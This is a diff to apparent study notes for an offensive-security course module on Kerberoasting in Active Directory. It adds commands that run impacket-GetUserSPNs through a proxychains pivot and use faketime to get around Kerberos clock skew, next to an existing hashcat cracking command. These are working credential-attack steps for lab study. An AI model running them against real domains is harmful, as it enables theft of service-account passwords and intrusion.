@@ -2,7 +2,7 @@
 
 - Module: PEN-200 · 23. Attacking Active Directory Authentication
 - Source: portal.offsec.com · module `attacking-active-directory-authentication-46102` (§23.2.3)
-- Code blocks: 3
+- Code blocks: 5
 
 > Any domain user can request a **service ticket (TGS)** for an SPN — it's encrypted with the
 > **service account's** password hash, so crack it offline for the account's cleartext password.
@@ -24,6 +24,23 @@ sudo hashcat -m 13100 {{HASHFILE}} /usr/share/wordlists/rockyou.txt -r /usr/shar
 
 ```bash
 sudo impacket-GetUserSPNs -request -dc-ip {{DC_IP}} {{DOMAIN}}/{{USERNAME}}
+```
+
+## Over a pivot (proxychains) + clock-skew fix
+
+> Roasting from Kali through a SOCKS pivot into the internal domain (see
+> [[../tunnelling/tunnelling]]): wrap the same command in `proxychains`.
+
+```bash
+proxychains -q impacket-GetUserSPNs -request -dc-ip {{DC_IP}} {{DOMAIN}}/{{USERNAME}}
+```
+
+> `KRB_AP_ERR_SKEW(Clock skew too great)` over a pivot (you can't NTP the DC through the proxy): read
+> the DC's time, then run the command under `faketime` set to that time.
+
+```bash
+proxychains net time -S {{DC_IP}}
+faketime 'YYYY-MM-DD HH:MM:SS' proxychains -q impacket-GetUserSPNs -request -dc-ip {{DC_IP}} {{DOMAIN}}/{{USERNAME}}
 ```
 
 > **Only user-account SPNs are worth it** — machine accounts, (g)MSAs, and `krbtgt` use random
